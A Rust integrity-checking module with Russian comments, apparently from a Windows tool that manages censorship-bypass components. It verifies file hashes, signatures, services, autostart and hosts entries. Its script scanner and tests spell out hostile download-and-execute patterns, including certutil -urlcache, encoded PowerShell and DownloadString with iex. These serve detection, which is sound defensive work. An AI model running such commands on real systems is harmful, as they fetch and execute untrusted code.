//! Проверка целостности и защита от подмены.
//!
//! Вирусы любят менять скрипты (.bat), драйверы и исполняемые файлы, подсовывать свои службы и записи
//! автозапуска. Бунт проверяет:
//! * файлы компонентов: SHA-256 каждого файла против списка, записанного при установке, а новые
//!   исполняемые файлы и скрипты считаются нарушением;
//! * скрипты (.bat, .cmd, .ps1, .vbs, .js): поиск заведомо опасных команд;
//! * цифровые подписи драйверов и исполняемых файлов;
//! * службы и драйверы (zapret, WinDivert): запускаются ли они из папки Бунта и подписаны ли;
//! * автозапуск Бунта (реестр и планировщик) и записи hosts, которые перенаправляют нужные сайты;
//! * сверку с оригинальным релизом на GitHub: она не зависит от файлов на диске, поэтому ловит
//!   и подмену самого списка хешей.
//!
//! Злоумышленник с правами администратора может подменить и список хешей, поэтому для полной
//! уверенности есть сверка с GitHub.

use serde::Serialize;
use sha2::{Digest, Sha256};
use std::{collections::BTreeMap, fs, io::Read, path::Path};

#[cfg(windows)]
use std::{os::windows::process::CommandExt, process::Command};

const MANIFEST: &str = ".bunt-manifest.json";

/// Файлы, которые меняются при обычной работе, в хеши не входят.
fn skipped(rel: &str) -> bool {
    let r = rel.replace('\\', "/").to_lowercase();
    r == MANIFEST || r.starts_with("logs/") || r.contains("__pycache__/") || r.ends_with(".pyc") || r == "winws.log" || r == "lists/ipset-all.txt" || r == "lists/ipset-all.txt.backup" || r == "bin/active_discord_udp.bin" || r == "bin/active_game_udp.bin" || r.ends_with("-user.txt")
}

pub(crate) fn hash_file(path: &Path) -> Result<String, String> {
    let mut f = fs::File::open(path).map_err(|e| e.to_string())?;
    let mut h = Sha256::new();
    let mut buf = [0u8; 64 * 1024];
    loop {
        let n = f.read(&mut buf).map_err(|e| e.to_string())?;
        if n == 0 {
            break;
        }
        h.update(&buf[..n]);
    }
    Ok(hex::encode(h.finalize()))
}

fn walk(base: &Path, dir: &Path, out: &mut BTreeMap<String, String>) -> Result<(), String> {
    for entry in fs::read_dir(dir).map_err(|e| e.to_string())?.flatten() {
        let path = entry.path();
        if path.is_dir() {
            walk(base, &path, out)?;
        } else if let Ok(rel) = path.strip_prefix(base) {
            let rel = rel.display().to_string().replace('\\', "/");
            if !skipped(&rel) {
                out.insert(rel, hash_file(&path)?);
            }
        }
    }
    Ok(())
}

fn hash_dir(dir: &Path) -> Result<BTreeMap<String, String>, String> {
    let mut out = BTreeMap::new();
    walk(dir, dir, &mut out)?;
    Ok(out)
}

/// Записывает список хешей для только что установленного компонента.
pub fn write_manifest(dir: &Path) -> Result<(), String> {
    let files = hash_dir(dir)?;
    let text = serde_json::to_string_pretty(&serde_json::json!({ "files": files })).map_err(|e| e.to_string())?;
    fs::write(dir.join(MANIFEST), text).map_err(|e| e.to_string())
}

#[derive(Serialize)]
pub struct Item {
    /// раздел страницы: «Файлы компонентов», «Скрипты» и т. д.
    group: String,
    title: String,
    /// ok | warn | bad | info
    state: String,
    note: Option<String>,
}

fn item(title: &str, state: &str, note: Option<String>) -> Item {
    Item { group: String::new(), title: title.to_string(), state: state.to_string(), note }
}

fn grouped(group: &str, mut list: Vec<Item>) -> Vec<Item> {
    for i in list.iter_mut() {
        if i.group.is_empty() {
            i.group = group.to_string();
        }
    }
    list
}

const EXEC_EXT: [&str; 14] = ["exe", "dll", "sys", "bat", "cmd", "ps1", "vbs", "js", "wsf", "scr", "lnk", "msi", "com", "jar"];
const SCRIPT_EXT: [&str; 6] = ["bat", "cmd", "ps1", "vbs", "js", "wsf"];

fn ext_of(rel: &str) -> String {
    rel.rsplit('.').next().filter(|e| !e.contains('/')).unwrap_or("").to_lowercase()
}

/// Файл, который может что-то выполнить.
fn is_executable(rel: &str) -> bool {
    EXEC_EXT.contains(&ext_of(rel).as_str())
}

fn is_script(rel: &str) -> bool {
    SCRIPT_EXT.contains(&ext_of(rel).as_str())
}

/// Заведомо опасные приёмы в скриптах. Список осторожный: обычные скрипты запрета
/// (в том числе service.bat) ничего из этого не используют.
pub(crate) fn suspicious(text: &str) -> Vec<&'static str> {
    let t = text.to_lowercase();
    let has = |s: &str| t.contains(s);
    let mut out = Vec::new();
    if has("-encodedcommand") || has(" -enc ") || has(" -e jab") || has(" -ec ") {
        out.push("закодированная команда PowerShell");
    }
    if has("frombase64string") {
        out.push("расшифровка base64");
    }
    if has("certutil") && (has("urlcache") || has("-decode")) {
        out.push("certutil качает или расшифровывает файл");
    }
    if has("bitsadmin") && has("/transfer") {
        out.push("bitsadmin качает файл");
    }
    if has("mshta") && (has("http:") || has("https:") || has("vbscript:") || has("javascript:")) {
        out.push("mshta запускает код из сети");
    }
    if has("regsvr32") && (has("/i:http") || has("scrobj")) {
        out.push("regsvr32 запускает код из сети");
    }
    if (has("downloadstring") || has("downloadfile") || has("invoke-webrequest")) && (has("iex") || has("invoke-expression") || has("start-process")) {
        out.push("скачивание и запуск кода");
    }
    if has("wscript.shell") && (has("http:") || has("https:")) {
        out.push("скрипт со ссылками в сеть и запуском программ");
    }
    if has("-windowstyle hidden") && (has("http:") || has("https:")) {
        out.push("скрытый PowerShell со ссылкой в сеть");
    }
    out
}

fn names(list: &[String]) -> String {
    let shown: Vec<&str> = list.iter().take(3).map(|s| s.as_str()).collect();
    let more = if list.len() > 3 { format!(" и ещё {}", list.len() - 3) } else { String::new() };
    format!("{}{}", shown.join(", "), more)
}

struct Diff {
    saved: usize,
    changed: Vec<String>,
    missing: Vec<String>,
    added: Vec<String>,
}

/// Сравнение файлов на диске со списком хешей. `None`: списка нет.
fn diff_dir(dir: &Path) -> Result<Option<Diff>, String> {
    let current = hash_dir(dir)?;
    let manifest = dir.join(MANIFEST);
    let saved: Option<BTreeMap<String, String>> = fs::read_to_string(&manifest)
        .ok()
        .and_then(|s| serde_json::from_str::<serde_json::Value>(&s).ok())
        .and_then(|v| serde_json::from_value(v.get("files")?.clone()).ok());
    let Some(saved) = saved else { return Ok(None) };
    Ok(Some(Diff {
        saved: saved.len(),
        changed: saved.iter().filter(|(k, v)| current.get(*k).map(|c| c != *v).unwrap_or(false)).map(|(k, _)| k.clone()).collect(),
        missing: saved.keys().filter(|k| !current.contains_key(*k)).cloned().collect(),
        added: current.keys().filter(|k| !saved.contains_key(*k)).cloned().collect(),
    }))
}

/// Сверка файлов компонента с записанными при установке хешами.
fn check_files(label: &str, dir: &Path) -> Vec<Item> {
    let title = format!("{label}: хеши файлов");
    let diff = match diff_dir(dir) {
        Ok(d) => d,
        Err(e) => return vec![item(&title, "bad", Some(format!("Не удалось прочитать файлы: {e}")))],
    };
    let Some(d) = diff else {
        let _ = write_manifest(dir);
        return vec![item(
            &title,
            "info",
            Some("Список хешей создан сейчас по текущим файлам (компонент поставлен до появления проверки). Дальше проверка сравнивает файлы с ним. Для полной уверенности переустановите компонент или нажмите «Сверить с GitHub».".into()),
        )];
    };

    let mut out = Vec::new();
    if d.changed.is_empty() && d.missing.is_empty() {
        out.push(item(&title, "ok", Some(format!("Проверено файлов: {}. Всё совпадает с установкой.", d.saved))));
    } else {
        let mut parts = Vec::new();
        if !d.changed.is_empty() {
            parts.push(format!("изменены: {}", names(&d.changed)));
        }
        if !d.missing.is_empty() {
            parts.push(format!("пропали: {}", names(&d.missing)));
        }
        out.push(item(&title, "bad", Some(format!("{}. Переустановите компонент.", parts.join("; ")))));
    }
    let (exec, other): (Vec<String>, Vec<String>) = d.added.iter().cloned().partition(|f| is_executable(f));
    if !exec.is_empty() {
        out.push(item(&format!("{label}: новые исполняемые файлы"), "bad", Some(format!("Появились файлы, которых не было при установке и которые могут что-то запускать: {}. Если вы их не добавляли, это может быть вирус.", names(&exec)))));
    }
    if !other.is_empty() {
        out.push(item(&format!("{label}: лишние файлы"), "warn", Some(format!("Появились файлы, которых не было при установке: {}.", names(&other)))));
    }
    out
}

/// Поиск опасных команд в скриптах компонента. Работает без списка хешей, поэтому видит и подмену
/// скриптов в тех компонентах, где список уже подделан.
fn check_scripts(label: &str, dir: &Path) -> Option<Item> {
    fn walk(dir: &Path, base: &Path, out: &mut Vec<(String, String)>, count: &mut usize) {
        let Ok(rd) = fs::read_dir(dir) else { return };
        for e in rd.flatten() {
            let p = e.path();
            if p.is_dir() {
                walk(&p, base, out, count);
            } else if let Ok(rel) = p.strip_prefix(base) {
                let rel = rel.display().to_string().replace('\\', "/");
                if !is_script(&rel) || e.metadata().map(|m| m.len() > 2_000_000).unwrap_or(true) {
                    continue;
                }
                *count += 1;
                let text = fs::read(&p).map(|b| String::from_utf8_lossy(&b).to_string()).unwrap_or_default();
                let hits = suspicious(&text);
                if !hits.is_empty() {
                    out.push((rel, hits.join(", ")));
                }
            }
        }
    }
    let (mut bad, mut count) = (Vec::new(), 0usize);
    walk(dir, dir, &mut bad, &mut count);
    if count == 0 {
        return None;
    }
    let title = format!("{label}: скрипты");
    Some(if bad.is_empty() {
        item(&title, "ok", Some(format!("Проверено скриптов: {count}. Опасных команд (скрытые загрузки, закодированный PowerShell) не найдено.")))
    } else {
        let list: Vec<String> = bad.iter().map(|(f, w)| format!("{f} ({w})")).collect();
        item(&title, "bad", Some(format!("В скриптах есть подозрительные команды: {}. Переустановите компонент.", list.iter().take(3).cloned().collect::<Vec<_>>().join("; "))))
    })
}

/// Цифровая подпись Windows: (статус, кто подписал).
fn signature(path: &Path) -> Option<(String, String)> {
    #[cfg(windows)]
    {
        let p = path.display().to_string().replace('\'', "''");
        let script = format!(
            "[Console]::OutputEncoding=[Text.Encoding]::UTF8; $s = Get-AuthenticodeSignature -LiteralPath '{p}'; \"$($s.Status)|$($s.SignerCertificate.Subject)\""
        );
        let o = Command::new("powershell")
            .args(["-NoProfile", "-NonInteractive", "-Command", &script])
            .creation_flags(0x0800_0000)
            .output()
            .ok()?;
        let text = String::from_utf8_lossy(&o.stdout).trim().to_string();
        let (status, subject) = text.split_once('|')?;
        return Some((status.to_string(), subject.to_string()));
    }
    #[cfg(not(windows))]
    {
        let _ = path;
        None
    }
}

fn signer_name(subject: &str) -> String {
    subject
        .split(',')
        .find_map(|p| p.trim().strip_prefix("CN=").map(|s| s.trim_matches('"').to_string()))
        .unwrap_or_else(|| subject.to_string())
}

fn check_signature(label: &str, file: &str, path: &Path) -> Option<Item> {
    if !path.exists() {
        return Some(item(&format!("{label}: подпись {file}"), "bad", Some("Файл не найден.".into())));
    }
    let (status, subject) = signature(path)?;
    let title = format!("{label}: подпись {file}");
    Some(match status.as_str() {
        "Valid" => item(&title, "ok", Some(format!("Подписан: {}.", signer_name(&subject)))),
        "NotSigned" => item(&title, "info", Some("Файл без цифровой подписи. Для этого файла это обычное дело, его целостность проверяют хеши.".into())),
        "HashMismatch" => item(&title, "bad", Some("Подпись не совпадает с содержимым: файл изменён после подписания.".into())),
        other => item(&title, "warn", Some(format!("Статус подписи: {other}."))),
    })
}

// ───────── службы, драйверы, автозапуск, hosts ─────────

#[cfg_attr(not(windows), allow(dead_code))]
fn norm_path(p: &str) -> String {
    p.trim().trim_matches('"').replace('/', "\\").to_lowercase()
}

/// Путь к программе из командной строки: в кавычках или до первого .exe.
pub(crate) fn exe_of_command(cmd: &str) -> String {
    let c = cmd.trim();
    if let Some(r) = c.strip_prefix('"') {
        return r.split('"').next().unwrap_or("").to_string();
    }
    let low = c.to_lowercase();
    match low.find(".exe") {
        Some(i) => c[..i + 4].to_string(),
        None => c.split_whitespace().next().unwrap_or("").to_string(),
    }
}

/// Значение из вывода `reg query ... /v Имя`.
pub(crate) fn reg_value(text: &str) -> Option<String> {
    let line = text.lines().find(|l| l.contains("REG_SZ") || l.contains("REG_EXPAND_SZ"))?;
    let (_, v) = line.split_once("REG_SZ").or_else(|| line.split_once("REG_EXPAND_SZ"))?;
    Some(v.trim().to_string())
}

/// Команда из XML задачи планировщика.
pub(crate) fn task_command(xml: &str) -> Option<String> {
    let s = xml.find("<Command>")? + "<Command>".len();
    let e = xml[s..].find("</Command>")? + s;
    Some(xml[s..e].replace("&quot;", "\"").replace("&amp;", "&").trim().to_string())
}

fn check_autostart() -> Vec<Item> {
    #[cfg_attr(not(windows), allow(unused_mut))]
    let mut out = Vec::new();
    #[cfg(windows)]
    {
        let me = std::env::current_exe().map(|p| norm_path(&p.display().to_string())).unwrap_or_default();
        let run = crate::settings::run_hidden("reg", &["query", r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run", "/v", "Bunt"]).and_then(|t| reg_value(&t));
        if let Some(v) = run {
            let exe = exe_of_command(&v);
            out.push(if norm_path(&exe) == me {
                item("Автозапуск Бунта (реестр)", "ok", Some("Запись указывает на этот Бунт.".into()))
            } else {
                item("Автозапуск Бунта (реестр)", "bad", Some(format!("Запись «Bunt» в автозапуске указывает на другой файл: {exe}. Это может быть подмена. Выключите и снова включите автозапуск в настройках.")))
            });
        }
        let task = crate::settings::run_hidden("schtasks", &["/Query", "/TN", crate::settings::TASK_NAME, "/XML"]).and_then(|t| task_command(&t));
        if let Some(cmd) = task {
            let exe = exe_of_command(&cmd);
            out.push(if norm_path(&exe) == me {
                item("Автозапуск от администратора (планировщик)", "ok", Some("Задача запускает этот Бунт.".into()))
            } else {
                item("Автозапуск от администратора (планировщик)", "bad", Some(format!("Задача планировщика запускает другой файл с правами администратора: {exe}. Это опасная подмена. Выключите и снова включите автозапуск от администратора в настройках.")))
            });
        }
    }
    out
}

fn check_services() -> Vec<Item> {
    let mut out = Vec::new();
    for (name, title) in [("zapret", "Служба zapret"), ("WinDivert", "Драйвер WinDivert"), ("WinDivert14", "Драйвер WinDivert 1.4")] {
        if !crate::zapret::service_exists(name) {
            continue;
        }
        let Some(path) = crate::zapret::service_binary(name) else {
            out.push(item(title, "warn", Some("Служба есть, но Бунт не смог прочитать путь к её файлу.".into())));
            continue;
        };
        if !crate::zapret::is_ours(&path) {
            let (state, hint) = if name == "zapret" {
                ("warn", "Это служба не из Бунта (например, из service.bat). Если вы её не ставили, проверьте файл.")
            } else {
                ("bad", "Драйвер загружен не из папки Бунта. Если это не остатки другого запрета, это может быть подмена драйвера.")
            };
            out.push(item(title, state, Some(format!("Запускается из {path}. {hint}"))));
            continue;
        }
        match signature(Path::new(&path)) {
            Some((st, subject)) if st == "Valid" => out.push(item(title, "ok", Some(format!("Из папки Бунта, подписан: {}.", signer_name(&subject))))),
            Some((st, _)) if st == "HashMismatch" => out.push(item(title, "bad", Some("Файл изменён после подписания.".into()))),
            Some((st, _)) if st == "NotSigned" && name == "zapret" => out.push(item(title, "ok", Some("Из папки Бунта. Файл проверяют хеши компонента.".into()))),
            Some((st, _)) => out.push(item(title, "warn", Some(format!("Из папки Бунта, статус подписи: {st}.")))),
            None => out.push(item(title, "info", Some("Из папки Бунта. Подпись в этой системе не проверялась.".into()))),
        }
    }
    out
}

/// Сайты, подмена которых через hosts ломает или перехватывает работу запретов.
const WATCHED: [&str; 12] = ["discord", "youtube", "googlevideo", "ytimg", "ggpht", "youtu.be", "telegram", "t.me", "github", "githubusercontent", "gstatic", "google"];

/// Записи hosts вне блока Бунта, которые перенаправляют наблюдаемые сайты.
pub(crate) fn foreign_hosts(text: &str) -> Vec<String> {
    let mut out = Vec::new();
    for raw in text.lines() {
        let line = raw.split('#').next().unwrap_or("").trim();
        let mut parts = line.split_whitespace();
        let Some(ip) = parts.next() else { continue };
        let names: Vec<&str> = parts.collect();
        if names.is_empty() || ip.starts_with("127.") && names.iter().all(|n| *n == "localhost") || ip == "::1" {
            continue;
        }
        for n in names {
            let n = n.to_lowercase();
            if WATCHED.iter().any(|w| n.contains(w)) {
                out.push(format!("{n} → {ip}"));
            }
        }
    }
    out
}

fn check_hosts() -> Option<Item> {
    let text = fs::read_to_string(crate::zapret_tools::hosts_path()).ok()?;
    let rest = crate::zapret_tools::strip_block(&text);
    let f = foreign_hosts(&rest);
    let title = "Файл hosts";
    Some(if f.is_empty() {
        item(title, "ok", Some("Нет записей, которые перенаправляют Discord, YouTube, Telegram или GitHub (записи Бунта не считаются).".into()))
    } else {
        item(title, "warn", Some(format!("В hosts есть записи, которых Бунт не добавлял: {}. Если вы их не делали сами, это может быть перехват сайтов.", names(&f))))
    })
}

fn check_self() -> Option<Item> {
    let exe = std::env::current_exe().ok()?;
    let title = "Сам Бунт";
    let hash = hash_file(&exe).ok().map(|h| format!(" SHA-256: {}…", &h[..16])).unwrap_or_default();
    Some(match signature(&exe) {
        Some((st, subject)) if st == "Valid" => item(title, "ok", Some(format!("Подписан: {}.{hash}", signer_name(&subject)))),
        Some((st, _)) if st == "HashMismatch" => item(title, "bad", Some("Файл Бунта изменён после подписания. Скачайте Бунт заново с GitHub.".into())),
        _ => item(title, "info", Some(format!("Бунт не подписан цифровой подписью, это нормально для программы с открытым кодом. Сверить файл можно по релизу на GitHub.{hash}"))),
    })
}

fn component_checks(id: &str, label: &str, dir: &Path, sigs: &[(&str, &str)], out: &mut Vec<Item>) {
    out.extend(grouped("Файлы компонентов", check_files(label, dir)));
    if let Some(i) = check_scripts(label, dir) {
        out.push(Item { group: "Скрипты".into(), ..i });
    }
    for (file, rel) in sigs {
        if let Some(i) = check_signature(label, file, &dir.join(rel)) {
            out.push(Item { group: "Подписи".into(), ..i });
        }
    }
    let _ = id;
}

fn run_check() -> Vec<Item> {
    let mut out = Vec::new();
    let mut any = false;
    if let Ok(dir) = crate::modules::active_dir("discord") {
        any = true;
        component_checks("discord", "Запрет Discord и YouTube", &dir, &[("winws.exe", "bin/winws.exe"), ("WinDivert64.sys", "bin/WinDivert64.sys")], &mut out);
    }
    if let Ok(dir) = crate::modules::active_dir("telegram") {
        any = true;
        component_checks("telegram", "Запрет Telegram", &dir, &[], &mut out);
        if let Some(py) = crate::telegram::runtime_python() {
            if let Some(i) = check_signature("Встроенный Python", "python.exe", &py) {
                out.push(Item { group: "Подписи".into(), ..i });
            }
        }
    }
    if let Ok(dir) = crate::modules::active_dir("fptn") {
        any = true;
        component_checks("fptn", "FPTN", &dir, &[("fptn-client-cli.exe", "fptn-client-cli.exe"), ("wintun.dll", "wintun.dll")], &mut out);
    }
    if let Ok(dir) = crate::modules::active_dir("wg") {
        any = true;
        component_checks("wg", "WireGuard / AmneziaWG", &dir, &[(crate::wg::EXE, crate::wg::EXE), (crate::wg::TOOL, crate::wg::TOOL)], &mut out);
    }
    for (id, label) in [("vless", "VLESS (Xray-core)"), ("proxy", "Proxy (Xray-core)")] {
        if let Ok(dir) = crate::modules::active_dir(id) {
            any = true;
            let sigs: &[(&str, &str)] = if dir.join("wintun.dll").is_file() { &[("wintun.dll", "wintun.dll")] } else { &[] };
            component_checks(id, label, &dir, sigs, &mut out);
        }
    }
    if !any {
        out.push(item("Компоненты", "info", Some("Нет установленных компонентов для проверки.".into())));
    }
    out.extend(grouped("Службы и драйверы", check_services()));
    out.extend(grouped("Автозапуск и система", check_autostart()));
    if let Some(i) = check_hosts() {
        out.push(Item { group: "Автозапуск и система".into(), ..i });
    }
    if let Some(i) = check_self() {
        out.push(Item { group: "Автозапуск и система".into(), ..i });
    }
    out
}

/// Проверка целостности установленных компонентов.
#[tauri::command]
pub async fn integrity_check() -> Result<Vec<Item>, String> {
    tauri::async_runtime::spawn_blocking(run_check).await.map_err(|e| e.to_string())
}

/// Хеши файлов из zip-архива релиза, прямо из памяти. Вложенная общая папка (как у zipball) отбрасывается.
fn hash_zip(bytes: &[u8]) -> Result<BTreeMap<String, String>, String> {
    let mut archive = zip::ZipArchive::new(std::io::Cursor::new(bytes)).map_err(|e| format!("Архив повреждён: {e}"))?;
    let mut files: Vec<(String, String)> = Vec::new();
    for i in 0..archive.len() {
        let mut entry = archive.by_index(i).map_err(|e| e.to_string())?;
        if entry.is_dir() {
            continue;
        }
        let Some(name) = entry.enclosed_name() else {
            return Err("В архиве небезопасный путь".into());
        };
        let rel = name.display().to_string().replace('\\', "/");
        let mut h = Sha256::new();
        let mut buf = [0u8; 64 * 1024];
        loop {
            let n = entry.read(&mut buf).map_err(|e| e.to_string())?;
            if n == 0 {
                break;
            }
            h.update(&buf[..n]);
        }
        files.push((rel, hex::encode(h.finalize())));
    }
    let first: std::collections::BTreeSet<&str> = files.iter().filter_map(|(p, _)| p.split('/').next()).collect();
    let strip = first.len() == 1 && files.iter().all(|(p, _)| p.contains('/'));
    Ok(files
        .into_iter()
        .map(|(p, h)| (if strip { p.split_once('/').map(|x| x.1.to_string()).unwrap_or(p) } else { p }, h))
        .filter(|(p, _)| !skipped(p))
        .collect())
}

async fn verify_online() -> Vec<Item> {
    let mut out = Vec::new();
    for (id, label) in [("discord", "Запрет Discord и YouTube"), ("telegram", "Запрет Telegram"), ("vless", "VLESS (Xray-core)"), ("proxy", "Proxy (Xray-core)")] {
        if crate::modules::active_dir(id).is_ok() {
            out.extend(grouped("Сверка с GitHub", verify_one(id, label).await));
        }
    }
    if out.is_empty() {
        out.push(item("Компоненты", "info", Some("Нет установленных компонентов для проверки.".into())));
    }
    out
}

async fn verify_one(id: &'static str, label: &str) -> Vec<Item> {
    let title = format!("{label}: сверка с оригиналом на GitHub");
    let Ok(dir) = crate::modules::active_dir(id) else {
        return Vec::new();
    };
    let version = dir.file_name().map(|n| n.to_string_lossy().to_string()).unwrap_or_default();

    // Тег релиза бывает с «v» и без неё
    let mut release = None;
    for tag in [format!("v{version}"), version.clone()] {
        if let Ok(r) = crate::modules::fetch_release_tag(id, &tag).await {
            release = Some(r);
            break;
        }
    }
    let Some(release) = release else {
        return vec![item(&title, "warn", Some(format!("Не нашёл на GitHub релиз версии {version} или нет связи. Сверка не выполнена.")))];
    };
    let (url, digest) = match crate::modules::archive_for(id, &release) {
        Ok(x) => x,
        Err(e) => return vec![item(&title, "warn", Some(e))],
    };
    let bytes = match crate::modules::download_bytes(&url).await {
        Ok(b) => b,
        Err(e) => return vec![item(&title, "warn", Some(format!("{e}. Сверка не выполнена.")))],
    };
    // Эталон надёжен, только если архив совпал с хешем, который сообщает GitHub
    let mut weak = false;
    match digest.as_deref().and_then(|d| d.strip_prefix("sha256:")) {
        Some(expected) => {
            if !hex::encode(Sha256::digest(&bytes)).eq_ignore_ascii_case(expected) {
                return vec![item(&title, "bad", Some("Скачанный архив не совпал с хешем GitHub. Сверке верить нельзя, проверьте соединение.".into()))];
            }
        }
        None => weak = true,
    }

    let reference = match tauri::async_runtime::spawn_blocking(move || hash_zip(&bytes)).await {
        Ok(Ok(r)) => r,
        Ok(Err(e)) => return vec![item(&title, "warn", Some(e))],
        Err(e) => return vec![item(&title, "warn", Some(e.to_string()))],
    };
    let dir2 = dir.clone();
    let current = match tauri::async_runtime::spawn_blocking(move || hash_dir(&dir2)).await {
        Ok(Ok(c)) => c,
        Ok(Err(e)) => return vec![item(&title, "bad", Some(format!("Не удалось прочитать файлы: {e}")))],
        Err(e) => return vec![item(&title, "warn", Some(e.to_string()))],
    };

    let changed: Vec<String> = reference.iter().filter(|(k, v)| current.get(*k).map(|c| c != *v).unwrap_or(false)).map(|(k, _)| k.clone()).collect();
    let missing: Vec<String> = reference.keys().filter(|k| !current.contains_key(*k)).cloned().collect();
    let mut added: Vec<String> = current.keys().filter(|k| !reference.contains_key(*k)).cloned().collect();
    if id == "vless" || id == "proxy" {
        added.retain(|f| f != "wintun.dll");
    }

    let mut out = Vec::new();
    if changed.is_empty() && missing.is_empty() {
        let note = format!("Файлов сверено: {}. Все совпадают с оригинальным релизом {}.{}", reference.len(), version, if weak { " GitHub не сообщил хеш архива, поэтому эталон менее надёжен." } else { "" });
        out.push(item(&title, if weak { "info" } else { "ok" }, Some(note)));
    } else {
        let mut parts = Vec::new();
        if !changed.is_empty() {
            parts.push(format!("отличаются от оригинала: {}", names(&changed)));
        }
        if !missing.is_empty() {
            parts.push(format!("пропали: {}", names(&missing)));
        }
        out.push(item(&title, "bad", Some(format!("{}. Это может быть подмена файлов. Переустановите компонент.", parts.join("; ")))));
    }
    if !added.is_empty() {
        let exec: Vec<String> = added.iter().filter(|f| is_executable(f)).cloned().collect();
        out.push(item(&format!("{label}: лишние файлы"), if exec.is_empty() { "warn" } else { "bad" }, Some(format!("Есть файлы, которых нет в оригинальном релизе: {}.{}", names(&added), if exec.is_empty() { "" } else { " Среди них исполняемые: так вирусы подкладывают свой код." }))));
    }
    out
}

/// Сверка установленных файлов с оригинальным релизом на GitHub. Не зависит от файлов на диске,
/// поэтому ловит и подмену списка хешей. Скачивает архив релиза.
#[tauri::command]
pub async fn integrity_verify_online() -> Result<Vec<Item>, String> {
    Ok(verify_online().await)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn detects_changed_missing_and_added_files() {
        let dir = std::env::temp_dir().join(format!("bunt-integrity-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(dir.join("bin")).unwrap();
        fs::create_dir_all(dir.join("lists")).unwrap();
        fs::write(dir.join("bin/winws.exe"), b"original").unwrap();
        fs::write(dir.join("general.bat"), b"bat").unwrap();
        fs::write(dir.join("lists/ipset-all.txt"), b"a").unwrap();
        write_manifest(&dir).unwrap();

        // правки, которые происходят при обычной работе, проверку не ломают
        fs::write(dir.join("lists/ipset-all.txt"), b"changed by bunt").unwrap();
        fs::write(dir.join("lists/list-general-user.txt"), b"mine").unwrap();
        fs::write(dir.join("winws.log"), b"log").unwrap();
        let r = check_files("T", &dir);
        assert_eq!(r.len(), 1);
        assert_eq!(r[0].state, "ok");

        // подмена и удаление файла
        fs::write(dir.join("bin/winws.exe"), b"evil").unwrap();
        fs::remove_file(dir.join("general.bat")).unwrap();
        fs::write(dir.join("extra.dll"), b"x").unwrap();
        let r = check_files("T", &dir);
        assert_eq!(r[0].state, "bad");
        let note = r[0].note.clone().unwrap();
        assert!(note.contains("bin/winws.exe") && note.contains("general.bat"), "{note}");
        assert_eq!(r[1].state, "bad", "новый .dll считается нарушением");

        // без списка хешей: создаётся эталон и сообщается об этом
        fs::remove_file(dir.join(MANIFEST)).unwrap();
        let r = check_files("T", &dir);
        assert_eq!(r[0].state, "info");
        assert!(dir.join(MANIFEST).exists());
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn flags_dropped_executables_as_bad() {
        let dir = std::env::temp_dir().join(format!("bunt-integrity-x-{}", std::process::id()));
        let _ = fs::remove_dir_all(&dir);
        fs::create_dir_all(&dir).unwrap();
        fs::write(dir.join("general.bat"), b"@echo off\r\nstart winws.exe").unwrap();
        write_manifest(&dir).unwrap();
        fs::write(dir.join("notes.txt"), b"x").unwrap();
        let r = check_files("T", &dir);
        assert!(r.iter().any(|i| i.state == "warn"));
        assert!(!r.iter().any(|i| i.state == "bad"));
        fs::write(dir.join("updater.ps1"), b"x").unwrap();
        let r = check_files("T", &dir);
        assert!(r.iter().any(|i| i.state == "bad" && i.title.contains("исполняемые")));
        // скрипты
        assert_eq!(check_scripts("T", &dir).unwrap().state, "ok");
        fs::write(dir.join("general.bat"), b"powershell -nop -w hidden -EncodedCommand AAAA").unwrap();
        assert_eq!(check_scripts("T", &dir).unwrap().state, "bad");
        let _ = fs::remove_dir_all(&dir);
    }

    #[test]
    fn suspicious_commands() {
        assert!(suspicious("@echo off\nstart \"zapret\" /min \"%BIN%winws.exe\" --wf-tcp=80").is_empty());
        assert!(suspicious("powershell -Command \"Get-NetAdapter\"\ncurl -s https://api.github.com/x").is_empty());
        assert!(!suspicious("certutil -urlcache -f http://x/a.exe a.exe").is_empty());
        assert!(!suspicious("powershell -c \"iex (New-Object Net.WebClient).DownloadString('http://x')\"").is_empty());
        assert!(!suspicious("[Convert]::FromBase64String('AA')").is_empty());
    }

    #[test]
    fn parsers() {
        assert_eq!(exe_of_command("\"C:\\Program Files\\Bunt\\Bunt.exe\" --hidden"), "C:\\Program Files\\Bunt\\Bunt.exe");
        assert_eq!(exe_of_command("C:\\Bunt\\Bunt.exe --hidden"), "C:\\Bunt\\Bunt.exe");
        assert_eq!(reg_value("\r\nHKEY_CURRENT_USER\\...\\Run\r\n    Bunt    REG_SZ    \"C:\\B\\Bunt.exe\" --hidden\r\n").unwrap(), "\"C:\\B\\Bunt.exe\" --hidden");
        assert_eq!(task_command("<Exec><Command>\"C:\\B\\Bunt.exe\"</Command></Exec>").unwrap(), "\"C:\\B\\Bunt.exe\"");
        let hosts = "127.0.0.1 localhost\n::1 localhost\n# c\n10.0.0.1 discord.com cdn.discordapp.com\n0.0.0.0 ads.example.com\n";
        assert_eq!(foreign_hosts(hosts), vec!["discord.com → 10.0.0.1", "cdn.discordapp.com → 10.0.0.1"]);
    }

    fn make_zip(files: &[(&str, &[u8])]) -> Vec<u8> {
        use std::io::Write;
        let mut w = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
        let opts = zip::write::SimpleFileOptions::default();
        for (name, data) in files {
            w.start_file(*name, opts).unwrap();
            w.write_all(data).unwrap();
        }
        w.finish().unwrap().into_inner()
    }

    #[test]
    fn hashes_zip_with_and_without_top_folder() {
        let flat = hash_zip(&make_zip(&[("bin/winws.exe", b"a"), ("general.bat", b"b"), ("lists/ipset-all.txt", b"c")])).unwrap();
        assert!(flat.contains_key("bin/winws.exe") && flat.contains_key("general.bat"));
        assert!(!flat.contains_key("lists/ipset-all.txt"), "изменяемые файлы в эталон не входят");

        let nested = hash_zip(&make_zip(&[("repo-1.0/bin/winws.exe", b"a"), ("repo-1.0/general.bat", b"b")])).unwrap();
        assert_eq!(nested, hash_zip(&make_zip(&[("bin/winws.exe", b"a"), ("general.bat", b"b")])).unwrap());
    }
}
